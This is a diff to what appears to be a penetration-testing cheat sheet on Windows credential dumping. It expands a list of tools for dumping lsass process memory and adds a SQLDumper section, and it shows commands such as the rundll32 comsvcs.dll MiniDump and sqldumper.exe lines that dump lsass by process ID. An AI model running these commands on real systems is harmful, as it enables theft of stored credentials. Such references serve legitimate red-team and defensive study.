@@ -128,10 +128,12 @@ $ w32tm /query /status
 
 There is various methods to dump the `lsass` process memory:
 
-- Mimikatz
-- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 - TaskManager
 - Rundll32 & comsvcs.dll
+- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
+- [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)
+- [SQLDumper](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/)
+- Mimikatz
 - [lsassy](https://github.com/Hackndo/lsassy)
 - [Silent Process Exit mechanism](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
 
@@ -151,6 +153,20 @@ tasklist /fi "imagename eq lsass.exe"
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
 ```
 
+
+#### SQLDumper
+
+You need to get the PID of `lsass` before dumping it. The tool can be found in
+one of the following path:
+
+```
+C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
+C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
+```
+
+```bash
+sqldumper.exe <PID> 0 0x01100:40
+```
 
 ### SAM and SYSTEM backup
 ```bash
